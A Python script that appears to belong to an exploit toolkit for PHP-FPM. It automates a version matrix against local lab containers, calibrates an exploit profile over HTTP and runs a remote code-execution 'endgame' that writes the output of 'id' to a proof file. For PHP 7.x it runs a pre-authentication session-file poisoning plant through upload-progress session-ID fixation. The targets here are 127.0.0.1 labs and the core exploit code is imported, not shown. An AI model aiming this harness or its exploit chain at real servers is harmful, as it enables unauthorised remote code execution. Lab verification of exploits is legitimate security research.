#!/usr/bin/env python3
"""php2shell_fpm_matrix.py — verify the remote chain on every unpatched build.

One lab at a time, so the ports never fight.  For each version it starts the
lab, calibrates the profile over HTTP when it is not verified yet, and then
runs the 100%-remote endgame.  The report says exactly which unpatched
releases RCE and which do not; patched releases are skipped.

    python3 tools/php2shell_fpm_matrix.py                 # default matrix
    python3 tools/php2shell_fpm_matrix.py 7.4.33 8.3.35   # just these

The default matrix is the newest unpatched release of every branch this
repository tracks (7.2, 7.4, 8.2, 8.3, 8.4).
"""

from __future__ import annotations

import argparse
import contextlib
import json
import os
import subprocess
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, HERE)

import php2shell_fpm_labs as labs  # noqa: E402
import php2shell_fpm_versions as registry  # noqa: E402

CLIENT = os.path.join(HERE, "php2shell_fpm.py")
OUTDIR = os.path.join(labs.WEBROOT, "out")

DEFAULT_MATRIX = ("7.2.34", "7.4.33", "8.2.34", "8.3.35", "8.4.0",
                  "8.4.25", "8.4.26")


def run(cmd: list[str], timeout: int = 3000) -> subprocess.CompletedProcess:
    return subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)


def lab(version: str, command: str) -> subprocess.CompletedProcess:
    return run([sys.executable, os.path.join(HERE, "php2shell_fpm_labs.py"),
                command, "--only", version], timeout=400)


def profile_verified(version: str) -> bool:
    path = os.path.join(ROOT, "profiles", f"{version}-fpm.json")
    try:
        with open(path, encoding="utf-8") as handle:
            profile = json.load(handle)
    except (OSError, ValueError):
        return False
    return bool(profile.get("verified") and profile.get("rce"))


def verify(version: str) -> tuple[str, str]:
    """Calibrate (if needed) and run the remote endgame for one version."""
    if not os.path.isfile(labs.fpm_bin(version)):
        return "NOT BUILT", ""
    if not registry.is_vulnerable(version):
        return "patched (skipped)", ""
    source = os.path.join(ROOT, "lab", "fpm", "runtime", "src",
                          f"php-{version}")
    uses_legacy_chain = (os.path.isdir(source)
                         and not registry.has_session_cancel_decode(source))

    proof = f"matrix-{version.replace('.', '')}"
    local = os.path.join(OUTDIR, proof)
    with contextlib.suppress(OSError):
        os.unlink(local)

    lab(version, "down")
    up = lab(version, "up")
    if up.returncode != 0:
        return "LAB FAILED", (up.stdout + up.stderr)[-160:]
    chain, builder, _chain_fpm, _builder_fpm = labs.builds_map([version])[version]
    base = f"http://127.0.0.1:{chain}"
    builder_url = f"http://127.0.0.1:{builder}"

    if uses_legacy_chain:
        # PHP <= 7.x: the struct-freeing chain does not apply, but the
        # upload-progress session-ID fixation does (see cmd_poison)
        print(f"\n===== {version}: session-file plant (pre-auth) =====",
              flush=True)
        plant = f"matrix-{version.replace('.', '')}"
        proc = run([sys.executable, CLIENT, "--version", version,
                    "--base", base, "--builder", builder_url, "poison",
                    "--sid", plant, "--payload",
                    f"PLANTED_{plant}"], timeout=600)
        for line in (proc.stdout + proc.stderr).strip().splitlines()[-3:]:
            print("   ", line, flush=True)
        lab(version, "down")
        ok = proc.returncode == 0
        return (("SESSION PLANT" if ok else "plant failed"),
                "pre-auth write into sess_<sid>" if ok else "")

    if not profile_verified(version):
        print(f"\n===== {version}: calibrating over HTTP =====", flush=True)
        calib = run([sys.executable, CLIENT, "--version", version,
                     "--base", base, "--builder", builder_url, "calibrate"])
        for line in (calib.stdout + calib.stderr).strip().splitlines()[-3:]:
            print("   ", line, flush=True)

    print(f"\n===== {version}: remote endgame =====", flush=True)
    proc = run([sys.executable, CLIENT, "--version", version,
                "--base", base, "--builder", builder_url,
                "--command", f"id>out/{proof}", "--proof-file",
                f"out/{proof}", "no-oracle"], timeout=1200)
    for line in (proc.stdout + proc.stderr).strip().splitlines()[-3:]:
        print("   ", line, flush=True)

    ok = os.path.isfile(local) and os.path.getsize(local) > 0
    text = ""
    if ok:
        with open(local, encoding="utf-8", errors="replace") as handle:
            text = handle.read().strip()[:52]
    lab(version, "down")
    return ("REMOTE RCE" if ok else "no proof"), text


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    parser.add_argument("versions", nargs="*", default=list(DEFAULT_MATRIX),
                        help="versions to verify (default: the unpatched matrix)")
    args = parser.parse_args()
    os.makedirs(OUTDIR, exist_ok=True)

    results = []
    for version in args.versions:
        status, text = verify(version)
        results.append((version, status, text))

    print("\n===== unpatched matrix, 100% HTTP =====")
    for version, status, text in results:
        print(f"  {version:9} {status:18} {text}")
    report = os.path.join("/tmp", "php2shell-matrix.json")
    with contextlib.suppress(OSError), open(report, "w", encoding="utf-8") as handle:
        json.dump(results, handle, indent=1)
    return 0


if __name__ == "__main__":
    sys.exit(main())
